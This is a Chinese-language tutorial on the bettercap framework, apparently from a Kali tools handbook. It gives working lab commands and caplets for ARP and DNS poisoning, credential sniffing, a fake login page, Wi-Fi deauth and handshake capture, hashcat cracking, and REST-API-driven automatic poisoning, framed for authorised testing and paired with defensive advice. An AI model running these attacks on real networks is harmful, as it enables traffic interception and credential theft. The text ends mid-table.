# bettercap（模块化 MITM 与无线侦察框架）

> **一句话**：一个用 Go 写的模块化框架，把 Wi-Fi/BLE/IPv4/IPv6 的侦察、中间人攻击、流量篡改统一到一个交互式控制台里，并可通过 REST API 脚本化。
> **分类**：无线攻击 ｜ **Kali 包**：`bettercap` ｜ **官方文档**：<https://www.bettercap.org>

## 1. 它解决什么问题

前面几篇工具各自只做一件事：[airodump-ng](airodump-ng.md) 抓包、[aireplay-ng](aireplay-ng.md) 注入、[ettercap](../07-嗅探与欺骗/ettercap.md) 做 ARP 投毒、[responder](../07-嗅探与欺骗/responder.md) 抓 NetNTLM 哈希、[macchanger](../07-嗅探与欺骗/macchanger.md) 改 MAC。

**bettercap 把它们整合成一个统一的框架**：

| bettercap 能做的 | 替代/等价工具 |
| --- | --- |
| Wi-Fi 扫描、deauth、PMKID/handshake 抓取 | [airodump-ng](airodump-ng.md) + [aireplay-ng](aireplay-ng.md) |
| BLE 设备扫描与枚举 | 独立蓝牙工具 |
| 2.4 GHz 键鼠（MouseJacking / DuckyScript 注入） | 专用硬件 |
| 主机发现与端口扫描 | `net.probe` / `syn.scan` |
| **ARP / DNS / NDP / DHCPv6 投毒** | [ettercap](../07-嗅探与欺骗/ettercap.md) |
| HTTP/HTTPS 透明代理与内容篡改 | [mitmproxy](../07-嗅探与欺骗/mitmproxy.md) |
| 凭据嗅探 | 内置 `net.sniff` |
| **REST API + WebSocket 事件** | 无直接等价物 |
| **Web UI** | — |
| MAC 地址伪装 | [macchanger](../07-嗅探与欺骗/macchanger.md) |
| **caplet 脚本（可复用的攻击剧本）** | 无直接等价物 |

**它的差异化价值**：

1. **模块化**：可以只开需要的模块（`net.probe` + `arp.spoof` + `net.sniff` 是最经典的组合），不需要的模块不占资源。
2. **脚本化**：`-caplet` 和 `-eval` 让整套攻击可以变成可复现的文件；REST API 让它能被别的程序驱动。
3. **一个控制台**：交互式命令行 + 实时事件流（`events.stream`），比同时开五个终端清爽得多。

**它的取舍**：

| | bettercap | 传统工具链 |
| --- | --- | --- |
| 上手速度 | 中（要学它的模块语法与 caplet） | 各工具参数独立，但更「所见即所得」 |
| 灵活性 | ⭐ **高**（脚本化 + API） | 中 |
| Wi-Fi 抓包细节控制 | 一般（不如 airodump-ng 细） | ⭐ 高 |
| HTTP 内容篡改 | 一般（不如 [mitmproxy](../07-嗅探与欺骗/mitmproxy.md) 的交互式界面） | ⭐ 高 |

**实务建议**：**用 bettercap 做「整合的 MITM 与自动化」，用专门工具做「精细的单点操作」**。例如抓 WPA 握手用 [airodump-ng](airodump-ng.md) + [aireplay-ng](aireplay-ng.md)，做 ARP 投毒 + 凭据嗅探的一体化流程用 bettercap。

## 2. 工作原理

### 2.1 架构

```
┌──────────────────────────────────────────────────┐
│  bettercap（单个 Go 二进制）                       │
│                                                   │
│  ┌─ 交互式控制台（REPL）                          │
│  │   help / set / get / <module> on / off        │
│  ├─ 模块系统（可独立启停）                         │
│  │   arp.spoof / dns.spoof / net.sniff / ...     │
│  ├─ caplet 脚本引擎                              │
│  │   把一串命令写进文件，-caplet 加载执行          │
│  ├─ REST API + WebSocket（api.rest 模块）         │
│  │   外部程序可以驱动 bettercap 并接收事件         │
│  └─ events.stream（事件总线）                     │
│     所有模块的日志/事件汇总到一个流                │
└──────────────────────────────────────────────────┘
```

**关键设计**：

- **一切皆模块**：`arp.spoof`、`dns.spoof`、`net.probe`、`wifi`、`ble.recon`… 每个都是可独立 `on`/`off` 的。
- **变量系统**：`set <变量> <值>` 配置模块参数（如 `arp.spoof.targets`），`get` 查看。
- **事件流**：所有模块的输出都走 `events.stream`，所以你能在一个终端看到全局。

### 2.2 Wi-Fi 模块（`wifi`）

bettercap 的 `wifi` 模块把 [aircrack-ng](aircrack-ng.md) 套件的几项能力整合进来：

| 能力 | 说明 |
| --- | --- |
| **扫描** | 列出 AP 与客户端（等价 [airodump-ng](airodump-ng.md)） |
| **deauth** | 断开客户端（等价 [aireplay-ng](aireplay-ng.md) `--deauth`） |
| **客户端无关的 PMKID 关联攻击** | 不需要客户端就能尝试拿 PMKID |
| **自动抓 WPA/WPA2 握手** | 配合 deauth 自动等到握手 |
| **站点漫游** | 在信道之间跳（或锁定） |

**`wifi` 模块的核心变量**：

| 变量 | 作用 |
| --- | --- |
| `wifi.interface` | 使用的无线接口 |
| `wifi.channel` / `wifi.frequency` | 锁定信道或频率 |
| `wifi.hop` | 是否跳频 |
| `wifi.region` | 区域（决定允许的信道） |
| `wifi.show.wps` | 显示 WPS 信息 |
| `wifi.show.manufacturer` | 显示厂商 |
| `wifi.show.hidden` | 显示隐藏 SSID |
| `wifi.deauth` 相关 | deauth 的目标与参数 |
| `wifi.handshake` 相关 | 握手/PMKID 的抓取与保存路径 |
| `wifi.monitor` 相关 | 是否由 bettercap 管理监听模式 |

**⚠️ 重要**：bettercap 会**自己管理网卡的监听模式**。**不要**先手工 `airmon-ng start`——否则会和 bettercap 抢网卡。

### 2.3 ARP 投毒（`arp.spoof`）—— MITM 的基础

**ARP 协议的核心缺陷**：它**没有任何认证机制**。任何设备都可以回答「谁拥有 192.168.1.1？」这个问题。

**ARP 投毒的原理**：

```
正常情况：
  受害者 192.168.1.100  →  "谁是 192.168.1.1？"  →  网关 192.168.1.1
  网关 192.168.1.1      →  "我是，我的 MAC 是 AA:AA:AA:AA:AA:AA"
  受害者缓存：192.168.1.1 → AA:AA:AA:AA:AA:AA   ✅ 正确

投毒后：
  攻击者持续向受害者发送：
              "192.168.1.1 的 MAC 是 攻击者MAC（CC:CC:CC:CC:CC:CC）"
  攻击者持续向网关发送：
              "192.168.1.100 的 MAC 是 攻击者MAC"
  受害者缓存：192.168.1.1 → CC:CC:CC:CC:CC:CC   ❌ 指向攻击者
  网关缓存：192.168.1.100 → CC:CC:CC:CC:CC:CC   ❌ 指向攻击者

结果：
  受害者 → 攻击者 → 网关 → 互联网
  受害者 ← 攻击者 ← 网关 ← 互联网
                   ↑
            攻击者在中间，可以读、改、丢
```

**`arp.spoof` 的关键变量**：

| 变量 | 作用 |
| --- | --- |
| `arp.spoof.targets` | 投毒目标（IP、范围、CIDR） |
| `arp.spoof.whitelist` | **白名单**（例如不要毒自己的网关，或保护关键设备） |
| `arp.spoof.internal` | 是否也毒**同网段内部**的主机间流量（默认只毒到网关的流量） |
| `arp.spoof.skip_restore` | 是否在退出时跳过 ARP 恢复（默认会恢复） |
| `arp.spoof.dry_run` | 只发一次探测，不持续投毒 |

**⚠️ `arp.spoof.whitelist` 极其重要**：它会**避免把网关自己毒掉**，否则你会把自己踢下线。bettercap 在多数情况下会自动处理，但**在授权测试中显式配置白名单是必须的**。

### 2.4 DNS 投毒（`dns.spoof`）

配合 ARP 投毒使用。原理：

```
1. 用 arp.spoof 把自己放在中间
2. 用 dns.spoof 拦截受害者的 DNS 查询
3. 对匹配的目标域名返回**你自己的 IP**（而不是真实 IP）
4. 受害者被引导到你的服务器（那里可以放仿冒的登录页）
```

| 变量 | 作用 |
| --- | --- |
| `dns.spoof.domains` | 要伪造的域名（逗号分隔，支持通配符） |
| `dns.spoof.address` | 返回的 IP 地址 |
| `dns.spoof.all` | 是否**响应所有** DNS 查询（默认只响应 `domains` 里列出的） |
| `dns.spoof.hosts` | 从 hosts 文件格式加载映射 |

**`dns.spoof.all` = 把受害者的所有 DNS 都指向你**——这会导致它几乎无法上网，实际使用中很少需要。

### 2.5 凭据嗅探（`net.sniff`）

| 能力 | 说明 |
| --- | --- |
| 捕获明文协议 | HTTP Basic、FTP、Telnet、POP3、IMAP、SMTP |
| 捕获哈希 | **NTLM（配合 [responder](../07-嗅探与欺骗/responder.md) 的 WPAD / 代理触发）** |
| 解析 pcap | `net.sniff.source` 可以指向 pcap 文件 |
| 统计 | 密码、用户名、URL、Cookie 等 |

| 变量 | 作用 |
| --- | --- |
| `net.sniff.verbose` | 详细程度 |
| `net.sniff.local` | 是否嗅探本机流量 |
| `net.sniff.source` | 数据源（接口名或 pcap 文件） |
| `net.sniff.output` | 把原始流量写入 pcap |
| `net.sniff.regexp` | 只匹配特定正则的包 |

**⚠️ 关键限制**：**HTTPS 默认抓不到内容**。要看到内容需要：

1. 部署 `http.proxy` / `https.proxy`（透明代理）+ **让受害者信任你的 CA 证书**；
2. 或使用 HSTS 绕过/降级（**这属于规避安全机制，在授权测试中也需明确许可**）。

**证书信任是 TLS 拦截的关键**：现代浏览器/App 会校验证书链。如果攻击者的 CA 不被信任，受害者会看到证书警告。**能成功拦截，意味着攻击者已经能影响受害者的信任配置**（这正是「证书固定（certificate pinning）」要防的事）。

### 2.6 caplet —— 可复现的攻击剧本

**caplet** 就是「用命令写成的脚本文件」。例如一个完整的 MITM 剧本：

```
# mitm.cap
set arp.spoof.targets 192.168.1.100
set arp.spoof.whitelist 192.168.1.1
set dns.spoof.domains example.local
set dns.spoof.address 192.168.1.50
set net.sniff.verbose true

net.probe on
arp.spoof on
dns.spoof on
net.sniff on
```

用法：

```bash
sudo bettercap -iface eth0 -caplet mitm.cap
```

**caplet 的价值**：把「一次成功的攻击」变成**可复现、可审计、可版本控制**的文件。这在**授权的渗透测试**中非常重要——ROE 往往要求你提交「你做了什么」的精确记录，caplet 就是最好的证据。

**bettercap 自带一批 caplet**：

```bash
ls /usr/share/bettercap/caplets/ 2>/dev/null
# 或
find / -name '*.cap' -path '*bettercap*' 2>/dev/null | head
```

### 2.7 REST API 与事件流（`api.rest`）

| 变量 | 作用 |
| --- | --- |
| `api.rest.address` | 监听地址 |
| `api.rest.port` | 端口（默认 8083） |
| `api.rest.username` / `api.rest.password` | 认证 |
| `api.rest.certificate` / `api.rest.key` | TLS 证书 |

**用 API 驱动 bettercap**：

```bash
# 启用 API
# 在交互式会话里：
> set api.rest.username admin
> set api.rest.password secret
> api.rest on

# 然后从外部调用
curl -u admin:secret -X POST http://127.0.0.1:8083/api/session \
  --data '{"cmd":"net.show"}'
```

**WebSocket 事件流**：`/api/events` 会推送所有模块的事件——这让 bettercap 可以被集成进更大的自动化编排系统。

## 3. 安装与快速上手

```bash
sudo apt install bettercap
bettercap -h
```

**注意 bettercap 的参数风格**：它是 Go 程序，用**单短横线的长选项**（`-iface`，不是 `--iface`）。这与大多数 Linux 工具不同，容易搞错。

**最短工作流（交互式）**：

```bash
# 有线的 MITM
sudo bettercap -iface eth0

# 无线的侦察
sudo bettercap -iface wlan0 -eval 'set wifi.interface wlan0; wifi.recon on'
```

进入交互式控制台后：

```
> help                      # 列出所有命令与模块
> help arp.spoof            # 查看某模块的详细帮助
> net.show                  # 显示已知主机
> set arp.spoof.targets 192.168.1.100
> arp.spoof on
> net.sniff on
```

**开局必做的三件事**：

```
1. help              → 看有哪些模块
2. net.show          → 看当前网络里有什么（net.recon 默认是 running）
3. help <module>     → 用哪个模块前先看它的帮助
```

## 4. 核心参数详解

### 4.1 命令行参数

| 参数 | 默认值 | 作用 | 使用建议 |
| --- | --- | --- | --- |
| `-iface <name>` | 自动选择 | **绑定的网络接口** | ⭐ **几乎总要显式指定**，避免选错网卡 |
| `-eval <cmd>` | — | 启动后执行命令（多条用 `;` 分隔） | ⭐ 快速设置变量或自动开模块 |
| `-caplet <file>` | — | 加载并执行 caplet 脚本 | ⭐ 可复现的攻击剧本 |
| `-autostart <modules>` | `events.stream` | 逗号分隔的自动启动模块列表 | 想开机就开某个模块时用 |
| `-caplets-path <path>` | — | caplet 的搜索路径 | 用自己的 caplet 时 |
| `-gateway-override <ip>` | 自动检测 | 手动指定网关 IP | 自动检测错误时用（**双网关/多网段环境常见**） |
| `-script <file>` | — | 加载会话脚本（JS 格式） | 高级脚本化 |
| `-silent` | — | 抑制所有非错误日志 | **后台/脚本运行** |
| `-no-colors` | — | 关闭彩色输出 | 日志重定向到文件时用 |
| `-no-history` | — | 不写交互式历史文件 | 保持无痕（注意：**这不是以「规避检测」为目的**，而是避免污染用户环境） |
| `-debug` | — | 打印调试信息 | 排错 |
| `-env-file <file>` | — | 从文件加载环境变量 | 持久化配置 |
| `-cpu-profile <file>` | — | 写 CPU profile | 性能分析 |
| `-mem-profile <file>` | — | 写内存 profile | 性能分析 |
| `-pcap-buf-size <int>` | `-1`（默认） | pcap 缓冲区大小 | 高流量时调大防丢包 |
| `-version` | — | 打印版本 | — |

### 4.2 交互式命令

| 命令 | 作用 |
| --- | --- |
| `help [MODULE]` | 列出所有命令/模块，或显示某模块的帮助 |
| `active` | 显示当前**正在运行**的模块 |
| `set NAME VALUE` | 设置变量 |
| `get NAME` / `get *` / `get NAME*` | 读取变量（支持通配符） |
| `read VARIABLE PROMPT` | 交互式读取输入并存到变量（**用来输入密码，避免写进历史**） |
| `include CAPLET` | 在当前会话里加载并执行 caplet |
| `! COMMAND` | 执行 shell 命令并打印输出 |
| `alias MAC NAME` | 给设备起别名 |
| `clear` | 清屏 |
| `sleep SECONDS` | 暂停 |
| `quit` | 退出 |

**`read` 命令很好用**——输入密码时不用把它写在命令行上（也就不会进 shell 历史）：

```
> read api.rest.password "API password: "
```

### 4.3 内置模块清单

| 模块 | 作用 | 备注 |
| --- | --- | --- |
| **`events.stream`** | 事件流 | **默认 running**，所有模块的输出都走它 |
| **`net.recon`** | 被动主机发现（监听 ARP/DHCP 等） | **默认 running**，只被动听 |
| `net.probe` | **主动**主机发现（发包探测） | 主动发帧，**会被检测** |
| `net.sniff` | 凭据/流量嗅探 | — |
| **`arp.spoof`** | ARP 投毒（IPv4 MITM） | ⭐ MITM 核心 |
| `dns.spoof` | DNS 投毒 | 配 `arp.spoof` |
| `dhcp6.spoof` | DHCPv6 投毒 | IPv6 MITM |
| `http.proxy` / `https.proxy` | 透明 HTTP/HTTPS 代理 | 内容篡改 |
| `any.proxy` | 任意 TCP 流量的透明代理 | — |
| `tcp.proxy` / `packet.proxy` | TCP 层/包层代理 | 高级 |
| `http.server` | 起一个简易 HTTP 服务器 | 配合 DNS 投毒做钓鱼页 |
| `api.rest` | REST API + WebSocket | 自动化编排 |
| `ble.recon` | BLE 设备扫描 | — |
| **`wifi`** | 802.11 侦察/deauth/PMKID/握手 | ⭐ 无线核心 |
| `mac.changer` | MAC 地址伪装 | — |
| `syn.scan` | 快速端口扫描 | 主动 |
| `mysql.server` | 假的 MySQL 服务器 | 蜜罐/凭据捕获 |
| `wol` | Wake-on-LAN | — |
| `gps` | GPS 支持 | — |
| `ticker` | 定时执行命令 | — |
| `update` | 自更新 | ⚠️ 联网下载二进制 |
| `caplets` | caplet 管理 | — |

**默认状态**（从 `help` 输出可见）：

```
      any.proxy > not running
       api.rest > not running
      arp.spoof > not running
        ble.recon > not running
    dhcp6.spoof > not running
      dns.spoof > not running
  events.stream > running            ← 默认
            net.probe > not running
      net.recon > running            ← 默认（只被动监听）
      net.sniff > not running
       syn.scan > not running
           wifi > not running
```

**`net.recon` 默认开启是很有讲究的**：它**只被动监听**已存在的流量（ARP 广播、DHCP 等），因此**不发送任何东西**。而 `net.probe` 是**主动发包**的，默认关闭。

### 4.4 `wifi` 模块的常用变量

| 变量 | 作用 | 示例 |
| --- | --- | --- |
| `wifi.interface` | 无线接口 | `set wifi.interface wlan0` |
| `wifi.region` | 区域 | `set wifi.region CN` |
| `wifi.channel` | 锁定信道 | `set wifi.channel 6` |
| `wifi.frequency` | 锁定频率（MHz） | `set wifi.frequency 2437` |
| `wifi.hop` | 是否跳频 | `set wifi.hop true` |
| `wifi.show.wps` | 显示 WPS | `set wifi.show.wps true` |
| `wifi.show.manufacturer` | 显示厂商 | `set wifi.show.manufacturer true` |
| `wifi.show.hidden` | 显示隐藏 SSID | `set wifi.show.hidden true` |
| `wifi.handshakes.file` | 握手/PMKID 保存路径 | `set wifi.handshakes.file /tmp/hs.pcap` |
| `wifi.deauth` 相关 | deauth 参数 | `help wifi` 查看完整列表 |

**用 `help wifi` 获取你本机版本的完整变量列表**——不同版本的变量名会有变化，**不要照搬网上旧教程**。

## 5. 实战演练

**环境声明**：以下全部在**你自己搭建的隔离实验网络**中进行（自建 Kali + 靶机 + 自己的路由器，host-only / 隔离 VLAN）。**ARP 投毒会劫持整个网段的流量——对任何非自有网络执行都属于未授权访问**。无线部分见 [aircrack-ng](aircrack-ng.md) 的法律章节。

### 场景 1：开局 —— 看当前网络有什么（只被动）

**这是最安全的起点**——`net.recon` 只被动监听。

```bash
sudo bettercap -iface eth0
```

**预期输出**

```
bettercap v2.41.5 (type 'help' for a list of commands)

192.168.56.0/24 > 192.168.56.20  » [14:30:15] [endpoint.new] endpoint 192.168.56.1 detected as 0a:00:27:00:00:00 (VirtualBox).
192.168.56.0/24 > 192.168.56.20  » [14:30:16] [endpoint.new] endpoint 192.168.56.10 detected as 08:00:27:12:34:56.
```

**提示符的含义**：

```
192.168.56.0/24  >  192.168.56.20
    ↑                     ↑
我的网段            我自己的 IP
```

**查看主机列表**：

```
192.168.56.0/24 > 192.168.56.20  » net.show
```

**预期输出**

```
+-----------------+--------------------+----------+-------------------------+---------+---------+------------+
|       IP        |        MAC         |   Name   |         Vendor          |  Sent   |  Recvd  | Last Seen  |
+-----------------+--------------------+----------+-------------------------+---------+---------+------------+
| 192.168.56.20   | 08:00:27:aa:bb:cc  | eth0     | PCS Systemtechnik GmbH  | 0 B     | 0 B     | 14:30:15   |
| 192.168.56.1    | 0a:00:27:00:00:00  | gateway  | VirtualBox              | 49 kB   | 20 kB   | 14:30:15   |
| 192.168.56.10   | 08:00:27:12:34:56  |          | PCS Systemtechnik GmbH  | 2.4 kB  | 2.4 kB  | 14:30:16   |
+-----------------+--------------------+----------+-------------------------+---------+---------+----------------+

↑ 0 B / ↓ 3.2 MB / 11354 pkts / 0 errs
```

**逐列解读**：

| 列 | 含义 |
| --- | --- |
| `IP` | 主机 IP |
| `MAC` | MAC 地址 |
| `Name` | 别名（本机接口名 / `gateway`）或 hostname |
| `Vendor` | 厂商（OUI 查询）——**判断设备类型的关键** |
| `Sent` / `Recvd` | 与该主机的流量 |
| `Last Seen` | 最后活动时间 |

**底部状态栏**：

```
↑ 0 B / ↓ 3.2 MB / 11354 pkts / 0 errs
   ↑        ↑          ↑          ↑
 上传     下载      包数       错误数
```

**主动探测（可选，会被检测）**：

```
> net.probe on
```

`net.probe` 会主动发送探测包来发现「沉默的」主机（不主动发 ARP 的设备）。**代价是它会发出流量**——在网络层可被检测。

**通常不需要开 `net.probe`**：`net.recon` 已经能通过被动监听 ARP 发现大部分设备。

### 场景 2：ARP 投毒 + 凭据嗅探（MITM 基础）

**⚠️ 前提**：目标必须是你**自己的**设备（例如你自己的一台虚拟机）。

**步骤 1：配置并开启 ARP 投毒**

```
> set arp.spoof.targets 192.168.56.10
> set arp.spoof.whitelist 192.168.56.1
> set arp.spoof.internal true
> arp.spoof on
```

| 命令 | 作用 |
| --- | --- |
| `set arp.spoof.targets 192.168.56.10` | 只毒这一台（**最小影响**） |
| `set arp.spoof.whitelist 192.168.56.1` | ⭐ **保护网关**——绝对不要把网关毒掉，否则整个网段断网 |
| `set arp.spoof.internal true` | 也投毒同网段内部流量（能看到 受害者↔其他内网主机 的流量） |
| `arp.spoof on` | 启动 |

**预期输出**

```
[14:32:01] [arp.spoof] started
[14:32:01] [arp.spoof] spoofing 1 targets
[14:32:02] [arp.spoof] 192.168.56.10 > gateway: 08:00:27:aa:bb:cc
[14:32:02] [arp.spoof] gateway > 192.168.56.10: 08:00:27:aa:bb:cc
```

**这两行的含义**：

| 行 | 含义 |
| --- | --- |
| `192.168.56.10 > gateway: 08:00:27:aa:bb:cc` | 告诉受害者「网关的 MAC 是我」 |
| `gateway > 192.168.56.10: 08:00:27:aa:bb:cc` | 告诉网关「那台主机的 MAC 是我」 |

**双向投毒完成 = 你在中间**。

**步骤 2：开启嗅探**

```
> set net.sniff.verbose true
> set net.sniff.local false
> net.sniff on
```

**预期输出**（当受害者访问 HTTP 时）

```
[14:33:10] [net.sniff.http.request] GET http://example.local/login.php from 192.168.56.10
[14:33:10] [net.sniff.http.response] 200 OK text/html
[14:33:11] [net.sniff.credentials] found: username=admin password=secret123 (HTTP POST, http://example.local/login.php)
```

**⭐ `[net.sniff.credentials]` 就是结果行**——它直接告诉你抓到了什么凭据。

**步骤 3：验证流量确实经过了中间**

在受害者机器上：

```bash
# Windows
arp -a
# 192.168.56.1   08-00-27-aa-bb-cc   dynamic   ← 网关的 MAC 变成了攻击者的
```

**这就是 ARP 投毒成功的铁证**。

**步骤 4：停止并恢复**

```
> arp.spoof off
> net.sniff off
```

**bettercap 默认会在停止时自动恢复 ARP 表**（除非设了 `arp.spoof.skip_restore`）。**永远不要设 `skip_restore`**——那会让受害者一直断网。

**步骤 5：退出后确认**

```
> exit
```

在受害者机器上确认 ARP 表已恢复：

```bash
arp -a
# 192.168.56.1   0a-00-27-00-00-00   dynamic   ← 恢复正常
```

**这是授权测试的基本礼貌**：**离开时把环境恢复原状**。

### 场景 3：DNS 投毒 + 假登录页

**⚠️ 这属于钓鱼，即使在授权测试中也必须明确写在 ROE 里。**

**步骤 1：准备一个仿冒页面**

```
> http.server on
```

bettercap 内置的 HTTP 服务器会服务当前目录的文件。

```bash
# 在另一个终端准备一个测试页面
mkdir -p /tmp/phish && cd /tmp/phish
cat > index.html <<'EOF'
<!DOCTYPE html>
<html><body>
<h1>Lab Test Login</h1>
<form method="POST" action="/login">
  <input name="username" placeholder="username">
  <input name="password" type="password" placeholder="password">
  <button>Login</button>
</form>
</body></html>
EOF
```

**步骤 2：配置 DNS 投毒**

```
> set dns.spoof.domains lab-test.local
> set dns.spoof.address 192.168.56.20
> dns.spoof on
```

| 命令 | 作用 |
| --- | --- |
| `set dns.spoof.domains lab-test.local` | **只伪造这一个域名**（最小影响） |
| `set dns.spoof.address 192.168.56.20` | 返回攻击者的 IP |
| `dns.spoof on` | 启动 |

**步骤 3：看效果**

在受害者机器上：

```bash
ping lab-test.local
# PING lab-test.local (192.168.56.20)  ← 指向了攻击者
curl http://lab-test.local/
# 返回你的仿冒页面
```

**步骤 4：捕获提交的凭据**

`net.sniff` 会捕获 POST 数据：

```
[14:40:22] [net.sniff.credentials] found: username=admin password=hunter2 (HTTP POST, http://lab-test.local/login)
```

**⭐ 这是 DNS 投毒 + 假页面的完整链条**：ARP 投毒（在中间）→ DNS 投毒（引导到我这）→ 假页面（收集凭据）→ net.sniff（记录）。

**防御视角（对应第 9 节）**：这个链条能成功的原因有三个：

1. **ARP 无认证** → 需要 **DHCP Snooping + Dynamic ARP Inspection（DAI）**；
2. **DNS 明文无验证** → 需要 **DNSSEC** 或 **DNS over HTTPS/TLS**；
3. **用户不检查证书/地址** → 需要 **HSTS + 证书固定 + 培训**。

### 场景 4：Wi-Fi 侦察与 deauth（无线部分）

**⚠️ 只能对你自己的 Wi-Fi 网络执行。**

**步骤 1：启动 bettercap 并配置 wifi 模块**

```bash
sudo bettercap
```

```
> set wifi.interface wlan0
> set wifi.show.manufacturer true
> set wifi.show.wps true
> wifi.recon on
```

**注意**：bettercap 会**自己处理监听模式**。**不要**先手工 `airmon-ng start`。

**预期输出**

```
[14:45:01] [wifi.recon] enabling monitor mode on wlan0 ...
[14:45:03] [wifi.recon] 1 access point(s) detected
[14:45:05] [wifi.ap.new] access point lab-test (AA:BB:CC:DD:EE:FF) detected (56 dBm)
[14:45:06] [wifi.client.new] client 12:34:56:78:9A:BC detected on lab-test
```

**列出结果**：

```
> wifi.show
```

**预期输出**（表格）

```
+-------------------+------+------+----+----------------------------------------+
|       BSSID       | RSSI | CHAN | .. | SSID                                   |
+-------------------+------+------+----+----------------------------------------+
| AA:BB:CC:DD:EE:FF |  -42 |    6 | .. | lab-test                               |
+-------------------+------+------+----+----------------------------------------+
```

**`help wifi`** 可以看本机版本的完整变量与命令——**不同版本差异较大，务必以本机为准**。

**步骤 2：锁定信道（避免漏帧）**

```
> set wifi.channel 6
```

**步骤 3：deauth（仅自己的网络！）**

```
> help wifi               # 先看当前版本支持哪些 deauth 相关命令
```

bettercap 的 wifi 模块提供 deauth 能力，具体命令形式随版本变化，**以 `help wifi` 输出为准**。

**⚠️ 再次强调**：deauth 会中断通信。**只对你自己的网络执行**。

**步骤 4：抓握手/PMKID**

bettercap 可以在 deauth 的同时自动捕获握手/PMKID 并保存。相关变量在 `help wifi` 里（如 `wifi.handshakes.file`）。

**抓到后**：

```bash
# 导出给 hashcat
hcxpcapngtool -o /tmp/wifi.22000 /tmp/hs.pcap
hashcat -m 22000 /tmp/wifi.22000 /usr/share/wordlists/rockyou.txt -O
```

**实务建议**：**抓包阶段用 bettercap 可以，但破解用 [hashcat](../04-口令攻击/hashcat.md)**。bettercap 的强项是「侦察与 MITM 的整合」，不是「无线抓包的精细控制」。

### 场景 5：用 caplet 做可复现的攻击剧本

**这是 bettercap 最有价值的用法**——把攻击变成可审计的文件。

**步骤 1：写一个 caplet**

```bash
cat > /tmp/lab-mitm.cap <<'EOF'
# lab-mitm.cap —— 仅用于自有隔离实验网络
# 目标：192.168.56.10（自建靶机）

set arp.spoof.targets 192.168.56.10
set arp.spoof.whitelist 192.168.56.1
set arp.spoof.internal true

set dns.spoof.domains lab-test.local
set dns.spoof.address 192.168.56.20

set net.sniff.verbose true
set net.sniff.output /tmp/lab-capture.pcap

net.probe on
net.sniff on
arp.spoof on
dns.spoof on

# 每 30 秒打印一次主机列表（可选的进度观察）
ticker on
EOF
```

**步骤 2：一条命令复现整个攻击**

```bash
sudo bettercap -iface eth0 -caplet /tmp/lab-mitm.cap
```

**caplet 的三大价值**：

| 价值 | 说明 |
| --- | --- |
| **可复现** | 同样的攻击可以在测试环境中一次次精确重现 |
| **可审计** | 在授权测试中，"我做了什么" 有了精确的记录——⭐ **ROE 合规的关键** |
| **可版本控制** | caplet 可以进 git，团队共享 |

**步骤 3：用 `-eval` 做临时设置**

如果只是改几个变量，不必写文件：

```bash
sudo bettercap -iface eth0 \
  -eval 'set arp.spoof.targets 192.168.56.10; set arp.spoof.whitelist 192.168.56.1; arp.spoof on'
```

### 场景 6：用 REST API 自动化（进阶）

**步骤 1：在交互式会话里启用 API**

```
> set api.rest.username labadmin
> read api.rest.password "API password: "      ← 用 read 避免密码进历史
> set api.rest.address 127.0.0.1
> set api.rest.port 8083
> api.rest on
```

**预期输出**

```
[14:50:01] [api.rest] api starting on https://127.0.0.1:8083 ...
[14:50:01] [api.rest] api.rest ready
```

（新版默认启用 TLS——注意是 `https`）

**步骤 2：从外部驱动 bettercap**

```bash
# 查询当前会话状态
curl -u labadmin:secret -X POST https://127.0.0.1:8083/api/session \
  -H 'Content-Type: application/json' \
  --data '{"cmd":"net.show"}' -k

# 动态开启某个模块
curl -u labadmin:secret -X POST https://127.0.0.1:8083/api/session \
  -H 'Content-Type: application/json' \
  --data '{"cmd":"arp.spoof on"}' -k
```

**步骤 3：订阅事件流（WebSocket）**

```bash
# 需要 websocat 或 wscat
sudo apt install websocat
websocat -k --basic-auth labadmin:secret wss://127.0.0.1:8083/api/events
```

**⭐ 这是 bettercap 最独特的能力**：把「手工渗透」变成「**可编排的自动化流程**」：

```text
[检测到内网出现新设备]  ← 由 net.recon 事件触发
        ↓
[自动开始 ARP 投毒]     ← 调 REST API
        ↓
[启动 net.sniff]        ← 调 REST API
        ↓
[捕获到凭据]            ← WebSocket 事件
        ↓
[推送到内部告警系统]
```

**这套机制在授权的红队演练中极有价值**——它可以和其他工具（C2、资产管理系统）联动。

## 6. 输出解读

### 交互式提示符

```
192.168.56.0/24 > 192.168.56.20  »
        ↑                  ↑
  已知的网段          本机 IP
```

**这个提示符本身就告诉你 bettercap 在网络中的位置**。

### 事件行的结构

```
[14:32:02] [arp.spoof] 192.168.56.10 > gateway: 08:00:27:aa:bb:cc
     ↑            ↑             ↑
   时间戳      来源模块        事件内容
```

**按模块过滤事件**：

```
> events.stream.filter arp.spoof     # 只看 arp.spoof 的事件（具体语法见 help events.stream）
```

### 关键事件类型

| 事件标签 | 含义 | 价值 |
| --- | --- | --- |
| `[endpoint.new]` | 发现新主机 | 侦察 |
| `[wifi.ap.new]` | 发现新 AP | 侦察 |
| `[wifi.client.new]` | 发现新客户端 | 侦察 |
| `[arp.spoof]` | ARP 投毒状态 | 确认 MITM 已建立 |
| **`[net.sniff.credentials]`** | ⭐ **抓到凭据** | **结果** |
| `[net.sniff.http.request]` / `[net.sniff.http.response]` | HTTP 请求/响应 | 内容嗅探 |
| `[dns.spoof]` | DNS 投毒命中 | 确认投毒生效 |
| `[net.sniff.mdns]` / `[net.sniff.nbns]` / `[net.sniff.dhcp]` | mDNS/NBT-NS/DHCP 流量 | 名称解析相关 |

### `net.show` 表格

见场景 1 的逐列解读。**重点看 `Vendor` 列**——它能告诉你设备的类型（`VirtualBox` = 虚拟机、`Apple` = 苹果设备、`VMware` = 虚拟机……）。**异常厂商 = 可疑设备**。

### 底部状态栏

```
↑ 0 B / ↓ 3.2 MB / 11354 pkts / 0 errs
```

| 字段 | 含义 |
| --- | --- |
| `↑` 上传 | 从你的机器发出的流量 |
| `↓` 下载 | 收到的流量 |
| `pkts` | 总包数 |
| **`errs`** | **错误数——持续增长说明有问题**（网卡问题、丢包、权限不足） |

### 判断成功

| 环节 | 成功标志 |
| --- | --- |
| 主机发现 | `net.show` 里出现目标 |
| ARP 投毒 | `[arp.spoof] ... > gateway` 与 `gateway > ...` 两行都出现；受害者 `arp -a` 显示网关 MAC 变了 |
| DNS 投毒 | `[dns.spoof]` 事件；受害者 `ping` 解析到你的 IP |
| 凭据嗅探 | **`[net.sniff.credentials] found: ...`** |
| Wi-Fi 侦察 | `wifi.show` 有目标 |
| Wi-Fi 握手 | `wifi.handshakes.file` 指定的文件里有内容 |

**下一步**：

| 结果 | 动作 |
| --- | --- |
| 抓到明文凭据 | 记录到报告；评估该协议（HTTP/FTP）的配置风险 |
